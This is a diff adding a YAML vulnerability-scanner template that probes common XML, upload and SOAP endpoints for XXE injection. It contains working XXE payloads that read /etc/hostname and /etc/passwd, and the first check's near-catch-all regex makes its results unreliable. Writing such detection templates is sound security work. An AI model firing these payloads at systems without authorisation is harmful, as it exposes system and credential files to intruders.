@@ -1,0 +1,84 @@
+id: whai-xxe-injection
+
+info:
+  name: XXE Injection Detection
+  author: whitehat-ai
+  severity: critical
+  description: Detects XML External Entity injection via common XML upload and API endpoints
+  tags: xxe,injection,xml,critical
+  reference:
+    - https://portswigger.net/web-security/xxe
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/api/import"
+      - "{{BaseURL}}/xml"
+      - "{{BaseURL}}/soap"
+      - "{{BaseURL}}/xmlrpc.php"
+      - "{{BaseURL}}/api/v1/xml"
+    headers:
+      Content-Type: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/hostname">
+      ]>
+      <root>
+        <data>&xxe;</data>
+      </root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "[a-zA-Z0-9._-]{1,64}"
+        condition: or
+
+      - type: word
+        negative: true
+        part: body
+        words:
+          - "error"
+          - "exception"
+          - "parse error"
+          - "not found"
+          - "<!DOCTYPE"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: "application/xml"
+      SOAPAction: "\"\""
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+        <soapenv:Body>
+          <test>&xxe;</test>
+        </soapenv:Body>
+      </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
